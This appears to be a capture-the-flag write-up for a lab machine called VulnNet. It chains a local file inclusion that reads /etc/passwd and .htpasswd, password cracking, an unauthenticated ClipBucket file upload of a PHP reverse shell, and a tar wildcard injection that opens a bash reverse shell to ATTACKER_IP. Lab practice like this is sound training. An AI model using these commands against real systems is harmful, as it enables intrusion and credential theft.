### [ Setup ]

Before doing anything, let's go ahead and update our /etc/hosts file:

![screenshot1](../assets/images/vulnnet/screenshot1.png)

---

### [ What is the user flag? (user.txt)  ]

As always, we start off by conducting a full `nmap` scan on the target machine.

```
sudo nmap -sC -sV -vv -T4 -p- 10.10.88.20
```

**Results:**

```

```

From the results, we can see that there are only 2 ports open: **22 (SSH)** and **80 (HTTP)**

Let's check out the HTTP Website:

![screenshot2](../assets/images/vulnnet/screenshot2.png)

We have the website of a company called VulnNet Entertainment.

I first tried to check for any low-hanging fruit in places like the robots.txt file and the source code. Unfortunately, there was nothing of interest.

Next, I noticed that there was a login page:

![screenshot5](../assets/images/vulnnet/screenshot5.png)

I tried to sign up for a new account, but the signup functionality does not work. I also didn't know any valid credentials, so this was a dead-end.

Next, I decided to run a `gobuster` scan to enumerate any hidden directories:

```
gobuster dir -u http://vulnnet.thm/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 25
```

![screenshot3](../assets/images/vulnnet/screenshot3.png)

While there weren't any directories that looked particularly interesting, I did manage to find some notable Javascript files in the **/js** directory:

![screenshot4](../assets/images/vulnnet/screenshot4.png)

There are 2 js files: **index__7ed54732.js** and **index__d8338055.js**.

Let's take a look at the first file: **index__7ed54732.js**:

![screenshot6](../assets/images/vulnnet/screenshot6.png)

The code is really unreadable right now, so let's pass it through a [Javascript beautifier](https://beautifier.io/):

![screenshot7](../assets/images/vulnnet/screenshot7.png)

Much better! 

Analyzing the code, we find an interesting subdomain:

![screenshot8](../assets/images/vulnnet/screenshot8.png)

We can confirm that this subdomain is live with another Gobuster scan. This time, we use the `vhost` scan mode:

```
gobuster vhost -u http://vulnnet.thm/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 25
```

![screenshot9](../assets/images/vulnnet/screenshot9.png)

The subdomain is indeed live, but we get a **401** status code (Unauthorized). Nevertheless, let's add the domain into our /etc/hosts file:

![screenshot10](../assets/images/vulnnet/screenshot10.png)

If we visit the sub-domain, we get a prompt to authenticate:

![screenshot11](../assets/images/vulnnet/screenshot11.png)

Look's like we'll need to obtain some credentials.

Next, let's take a look at the other javascript file: **index__d8338055.js**:

![screenshot12](../assets/images/vulnnet/screenshot12.png)

Within the code, there is a specific url that catches my attention. Perhaps the `referer` parameter is susceptible to local file inclusion (LFI)?

Let's test this out using `curl`:

```
curl http://vulnnet.thm/index.php?referer=/etc/passwd
```

![screenshot13](../assets/images/vulnnet/screenshot13.png)

Great, LFI works! From the /etc/passwd file, we know that there is a user called **server-management** on the machine.

Let's try to read some credentials that we can use to login into `http://broadcast.vulnnet.thm`. These creds will normally be stored in the **.htpasswd** file. 

Using [Wappalyzer](https://www.wappalyzer.com/), we find out that the web server is running Apache2:

![screenshot14](../assets/images/vulnnet/screenshot14.png)

Apache2 configuration files are normally stored in **/etc/apache2/**. Let's see if we can read the .htpasswd file:

```
curl http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd
```

![screenshot15](../assets/images/vulnnet/screenshot15.png)

We managed to obtain a set of credentials! The password is hashed, but we can easily crack it using `john`.

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![screenshot16](../assets/images/vulnnet/screenshot16.png)

The credentials is:

> developers : 9972761drmfsls

With these credentials, we can now log into `http://broadcast.vulnnet.thm`:

![screenshot17](../assets/images/vulnnet/screenshot17.png)

And we are brought to a ClipBucket website.

The first thing I did was to search for any existing vulnerabilities for Clipbucket. I used `searchsploit` to do so.

![screenshot18](../assets/images/vulnnet/screenshot18.png)

We're dealing with **ClipBucket 4.0**, so the exploit that interests me is the last one: `ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injection`.

Let's check out how the exploit works:

![screenshot19](../assets/images/vulnnet/screenshot19.png)

Essentially, we are able to upload arbitrary files and inject OS commands **without being authenticated** using either the **file_uploader.php** or **beats_uploader.php** scripts. We can also carry out SQL injections, although that is unnecessary for this room.

With this in mind, let's try to upload a reverse shell script so that we can gain an initial foothold into our target.

*(I'll be using the PHP reverse shell script by [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell))*

To upload the script (named shell.php), we run the following command:

```
curl -u developers:9972761drmfsls -F "file=@shell.php" -F "plupload=1" -F "name=shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
```

*(`-u` is used to specify a username and password for authentication, which we need in our case)*

![screenshot20](../assets/images/vulnnet/screenshot20.png)

Nice, the upload was successful! We can see that our reverse shell script has been saved as **16399797456ddaad.php** in a file directory called **CB_BEATS_UPLOAD_DIR** on the machine.

Now we need to locate the file so that we can access and execute it. Doing some research, I found this [exploit](https://packetstormsecurity.com/files/146913/ClipBucket-beats_uploader-Unauthenticated-Arbitrary-File-Upload.html).

**Snippet of exploit:**

![screenshot21](../assets/images/vulnnet/screenshot21.png)

From the exploit, we can see that our uploaded file will be stored in **/actions/CB_BEATS_UPLOAD_DIR/**.

With that, I set up a netcat listener and opened the reverse shell by visiting: 

`http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/16399797456ddaad.php`

![screenshot22](../assets/images/vulnnet/screenshot22.png)

And we're in :smile:

As expected, there is a user called **server-management** on the machine, but we are unable to access their home directory.

I did some manual enumeration of the machine, eventually finding an interesting cronjob in /etc/crontab:

![screenshot23](../assets/images/vulnnet/screenshot23.png)

There is a script called `backupsrv.sh` that is being run **every 2 minutes** by root! Let's take a look at this script:

![screenshot24](../assets/images/vulnnet/screenshot24.png)

The script basically uses `tar` to compress the contents of **/home/server-management/Documents** and saves the result to **/var/backups**. I already have an idea of how to exploit this, but we first need to log into server-management's account so that we can access his **Documents** directory.

For now, let's check out **/var/backups**:

![screenshot25](../assets/images/vulnnet/screenshot25.png)

There's an interesting file owned by server-management called **ssh-backup.tar.gz**.

While we cannot directly unzip this file, we can simply download it onto our local machine and unzip it there!

![screenshot26](../assets/images/vulnnet/screenshot26.png)

The zip file actually contains the SSH private key of server-management! We can now use it to log into server-management's account:

![screenshot27](../assets/images/vulnnet/screenshot27.png)

Hmmm we need a passphrase. We can use `ssh2john` and `john` to crack the passphrase:

```
/usr/share/john/ssh2john.py id_rsa > ssh_hash
john ssh_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![screenshot28](../assets/images/vulnnet/screenshot28.png)

And we've got the passphrase:

> oneTWO3gOyac

We can now log into server-management's account:

![screenshot29](../assets/images/vulnnet/screenshot29.png)

We can then obtain the **user flag** from server-management's home directory:

![screenshot30](../assets/images/vulnnet/screenshot30.png)

---

### [ What is the root flag? (root.txt) ]

Remember the **backupsrv.sh** script from earlier?

There is a line in the script that is most definitely our privesc vector:

![screenshot31](../assets/images/vulnnet/screenshot31.png)

We can see that the **wildcard operator (*)** is used. 

Further down the script, there is this line of code:

![screenshot32](../assets/images/vulnnet/screenshot32.png)

This can basically be expanded into: `tar czf /var/backups/<file_name> *`

*(Note that the script has already `cd` into the /home/server-management/Documents directory at this point.)*

If we look at [GTFOBins](https://gtfobins.github.io/gtfobins/tar/), we can find the following exploit for `tar`:

![screenshot33](../assets/images/vulnnet/screenshot33.png)

Thus, we can open up a root shell if we can ensure that the `tar` command in backupsrv.sh is executed with `--checkpoint=1` and `--checkpoint-action=exec=/bin/sh`. 

Even though we do not have the permissions to directly write over backupsrv.sh, we can however create some files in **/home/server-management/Documents** with the names `--checkpoint=1` and `--checkpoint-action=exec=/bin/sh`.

Because `*` is used, it will be replaced with the names of all the files in /home/server-management/Documents, including our created files. These files will then be recognized as the arguments in the `tar` command, instead of as file names.

---

**How wildcard operator (*) works:**

*For eg, we have a directory with two files: a.txt and b.txt.*

*If we do `rm *`, this basically becomes `rm a.txt b.txt`*

*If we now have a file named -rf, then it will be recognised as a command-line argument as the command now becomes `rm -rf a.txt b.txt`*

---

Let's carry out the exploit:

```
cd /home/server-management/Documents
touch -- --checkpoint=1
echo $'#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > shell.sh
touch -- --checkpoint-action=exec=bash\ shell.sh
```

*(The `--` is used to denote the end of options for the `touch` command. This allows us to have the `--` characters in our filename)*

This is how the directory looks like after creating the files:

![screenshot34](../assets/images/vulnnet/screenshot34.png)

With that done, we just have to wait for 2 minutes to pass before a root shell was opened:

![screenshot35](../assets/images/vulnnet/screenshot35.png)

We can then obtain the **root flag** from /root:

![screenshot36](../assets/images/vulnnet/screenshot36.png)
